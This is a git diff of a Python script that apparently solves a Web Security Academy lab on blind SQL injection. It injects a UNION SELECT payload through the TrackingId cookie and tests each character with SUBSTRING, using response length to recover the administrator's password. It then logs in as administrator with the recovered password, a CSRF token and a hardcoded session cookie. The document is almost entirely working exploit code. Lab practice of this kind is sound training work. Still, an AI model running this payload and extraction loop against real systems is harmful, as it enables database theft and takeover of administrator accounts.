@@ -3,13 +3,13 @@
 import requests
 requests.packages.urllib3.disable_warnings()
 
-base = "https://acdb1f7d1e55404380a2442800360083.web-security-academy.net"
+base = "https://ac8a1ff61e33dba180d070130087003b.web-security-academy.net"
 url = base
 
 proxy = "127.0.0.1:8080"
 proxies = {"https": proxy, "http": proxy}
 verify = False
-cookies = {"session": "iZBX4ehYKKpF95lQkMKvFbqpG8qdM7U2"}
+cookies = {"session": "zqQml9zBHILhCtrd6ByToPKrnHMywAld"}
 key = "TrackingId"
 sqliPrefix = "' UNION SELECT 'a' FROM users WHERE username = 'administrator' AND"
 
@@ -29,9 +29,13 @@ def determineStringLength():
 
 
 def conditionalResponses(): # 20 len
+    digitCodePoints = [i for i in range(48, 58)]
+    lowerCaseAlphabetCodePoints = [i for i in range(97, 123)]
+    codePointList = digitCodePoints + lowerCaseAlphabetCodePoints
+
     def findLengthOfTrueResponse():
         lengths = {}
-        for i in range(32, 127):
+        for i in codePointList:
             value = f"{sqliPrefix} SUBSTRING(password, 1, 1) = '{chr(i)}'-- "
             cookies[key] = value
             r = requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
@@ -40,6 +44,7 @@ def conditionalResponses(): # 20 len
                 lengths[l] += 1
             else:
                 lengths[l] = 1
+                # print(f"{l}: {chr(i)}")
 
         for k, v in lengths.items():
             print(f"{k}: {v}")
@@ -53,29 +58,33 @@ def conditionalResponses(): # 20 len
             return r
 
         def makeRequestAndDetermineIfResponseIndicatesSQLQueryReturnedTrue(i, operator, pwdSubstr):
-            l = 10994
+            lengthOfTrueResponse = 11030
             r = getResponseFromRequest(i, operator, pwdSubstr)
-            return len(r.content) == l
+            l = len(r.content)
+            return l == lengthOfTrueResponse
 
         password = []
         for i in range(1,21):
-            l = 32
-            r = 127
-            while l <= r:
-                index = (l + r) // 2
-                pwdSubstr = chr(index)
-                if makeRequestAndDetermineIfResponseIndicatesSQLQueryReturnedTrue(i, "<", pwdSubstr): l = index + 1
-                elif makeRequestAndDetermineIfResponseIndicatesSQLQueryReturnedTrue(i, ">", pwdSubstr): r = index - 1
-                else:
+            for j in codePointList:
+                pwdSubstr = chr(j)
+                if makeRequestAndDetermineIfResponseIndicatesSQLQueryReturnedTrue(i, "=", pwdSubstr):
                     password.append(pwdSubstr)
                     break
         print(''.join(password))
-        # ugjsbdavzeyhta1p86u3
 
     # findLengthOfTrueResponse()
     determinePasswordUsingBinarySearch()
 
+def login():
+    url = base + "/login"
+    csrf = "jWRUlTicBexYW7xkFnUpA1H1bsVWnVcv"
+    username = "administrator"
+    password = "72qru00xujpoxc0epf23"
+    data = {"csrf": csrf, "username": username, "password": password}
+    requests.post(url, cookies=cookies, data=data, proxies=proxies, verify = verify)
+
 
 # findNumberOfColumns()
 # determineStringLength()
-conditionalResponses()
+# conditionalResponses()
+login()
